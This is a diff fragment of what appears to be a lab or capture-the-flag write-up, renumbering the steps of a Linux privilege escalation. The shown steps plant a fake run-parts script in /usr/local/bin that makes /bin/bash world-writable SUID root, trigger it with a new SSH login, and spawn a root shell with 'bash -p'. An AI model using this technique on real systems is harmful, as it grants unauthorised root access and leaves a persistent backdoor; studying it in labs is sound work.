@@ -45,21 +45,21 @@ $ pspy64
 **Exploit**
 
 ```bash
-# Add a run-parts script in /usr/local/bin/
+# 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
 #! /bin/bash
 chmod 4777 /bin/bash
 
-# Don't forget to add a execute permission
+# 0x2 Don't forget to add a execute permission
 $ chmod +x /usr/local/bin/run-parts
 
-# start a new ssh sesstion to trigger the run-parts program
+# 0x3 start a new ssh sesstion to trigger the run-parts program
 
-# check premission for `u+s`
+# 0x4 check premission for `u+s`
 $ ls -la /bin/bash
 -rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash
 
-# root it
+# 0x5 root it
 $ /bin/bash -p
 ```
 
